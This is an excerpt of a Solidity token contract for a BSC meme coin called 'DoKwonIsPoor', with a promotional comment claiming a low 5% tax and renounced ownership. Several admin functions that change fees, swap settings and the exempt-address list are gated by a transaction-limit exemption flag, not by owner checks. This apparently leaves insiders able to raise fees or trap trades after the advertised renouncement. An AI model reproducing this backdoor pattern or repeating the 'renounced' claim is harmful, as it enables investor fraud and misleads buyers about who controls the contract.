...
/*
DoKwonIsPoor | DoKwonIsPoor, Moon this token to help him Burn LUNA (BSC)
https://t.me/doKwonIsPoor
    
DoKwon can't afford to buyback and burn Luna. Let's moon this token and we buyback and burn luna.
Lowtax 5% Renounced, Feel free to scalping.
*/
...
contract DoKwonIsPoor is IERC20, Ownable {
    ...
    string _name = "DoKwonIsPoor";
    string _symbol = "$DoKwonIsPoor";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100_000_000_000_000_000 * (10 ** _decimals);
    ...
    function changeFees2(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _giveawayFee) external {
        require(isTxLimitExempt[msg.sender]);
    ...
    function setSwapBackSettingsES(bool _enabled, bool _alternate) external {
        require(isTxLimitExempt[msg.sender]);
    ...
    function changeMaxWallet(uint256 percent, uint256 denominator) external onlyOwner {
        require(isTxLimitExempt[msg.sender], "Max wallet must be greater than 1%");
    ...
    function setIsTLE(address[] calldata accounts, bool excluded) external {
        require(isTxLimitExempt[msg.sender]);
